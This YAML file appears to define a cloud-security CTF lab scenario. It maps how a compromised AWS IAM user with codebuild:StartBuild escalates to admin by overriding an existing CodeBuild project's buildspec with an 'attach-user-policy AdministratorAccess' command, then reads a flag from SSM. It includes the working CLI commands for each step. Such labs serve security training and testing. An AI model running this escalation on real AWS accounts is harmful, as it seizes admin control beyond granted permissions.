attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-codebuild-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has codebuild:StartBuild permission (along with helpful permissions
        codebuild:ListProjects, codebuild:BatchGetProjects, and codebuild:BatchGetBuilds),
        but notably does NOT have iam:PassRole or codebuild:CreateProject. Look for
        existing CodeBuild projects that have privileged service roles attached.

    - id: codebuild-project
      label: "Existing CodeBuild Project"
      type: resource
      subType: codebuild-project
      arn: "arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-002-to-admin-existing-project"
      description: >
        This pre-existing CodeBuild project has a privileged service role attached. By
        starting a build with a buildspec override, you can execute arbitrary commands
        under the project's service role without needing iam:PassRole or
        codebuild:CreateProject permissions.

    - id: project-role
      label: "Privileged Project Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-codebuild-002-to-admin-project-role"
      description: >
        This IAM role is attached to the CodeBuild project as its service role. It has
        AdministratorAccess, meaning any build running under this project can perform any
        AWS action — including attaching managed policies to IAM users. The malicious
        buildspec executes under this role's permissions, attaching AdministratorAccess
        directly to the starting user and completing the privilege escalation.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/codebuild-002-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: codebuild-project
      label: "codebuild:StartBuild"
      description: >
        Trigger a build on the existing project using --buildspec-override to supply
        a malicious buildspec that attaches AdministratorAccess to the starting user.
      hints:
        - "Use codebuild:StartBuild with --buildspec-override to supply a malicious buildspec for a single run without modifying the project. The override completely replaces the project's build instructions for that build only. Inject iam:AttachUserPolicy to grant AdministratorAccess to your starting user."
        - "Poll codebuild:BatchGetBuilds until buildStatus reaches SUCCEEDED, then wait 15 seconds for IAM policy propagation before verifying the escalation."
        - "Browse to https://pathfinding.cloud/paths/codebuild-002 for technique details."
      commands:
        - description: "List existing CodeBuild projects"
          command: "aws codebuild list-projects"
        - description: "Inspect the project's service role"
          command: "aws codebuild batch-get-projects --names pl-prod-codebuild-002-to-admin-existing-project --query 'projects[0].serviceRole'"
        - description: "Start a build with a malicious buildspec override"
          command: |
            aws codebuild start-build \
              --project-name pl-prod-codebuild-002-to-admin-existing-project \
              --buildspec-override 'version: 0.2\nphases:\n  build:\n    commands:\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
        - description: "Wait for the build to complete"
          command: "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].buildStatus'"

    - from: codebuild-project
      to: project-role
      label: "iam:AttachUserPolicy"
      description: >
        The CodeBuild project executes the override buildspec using its attached service
        role. The malicious buildspec uses the project role's IAM permissions to attach
        AdministratorAccess directly to the starting user, completing the escalation.
      hints: []
      commands:
        - description: "Verify administrator access with original credentials"
          command: "aws iam list-users --max-items 1"

    - from: project-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the parameter name /pathfinding-labs/flags/codebuild-002-to-admin to retrieve the flag."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/codebuild-002-to-admin --query 'Parameter.Value' --output text"
